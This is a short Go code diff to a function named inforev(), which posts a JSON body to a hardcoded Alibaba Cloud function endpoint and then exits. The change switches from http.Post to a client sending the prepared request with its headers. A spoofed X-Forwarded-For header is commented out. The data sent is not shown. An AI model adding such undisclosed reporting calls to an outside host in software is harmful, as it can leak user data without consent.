@@ -35,7 +35,8 @@ func inforev() {
 	req, _ := http.NewRequest("POST", "https://1745003471876288.cn-hangzhou.fc.aliyuncs.com/2016-08-15/proxy/service/api/", bytes.NewBuffer(jstr))
 	req.Header.Add("Content-Type", "application/json;charset=utf-8")
 	//req.Header.Add("X-Forwarded-For", ip)
-	_, _ = http.Post("https://1745003471876288.cn-hangzhou.fc.aliyuncs.com/2016-08-15/proxy/service/api/", "application/json;charset=utf-8", bytes.NewBuffer(jstr))
+	client := &http.Client{}
+	_, _ = client.Do(req)
 	exit()
 }
 
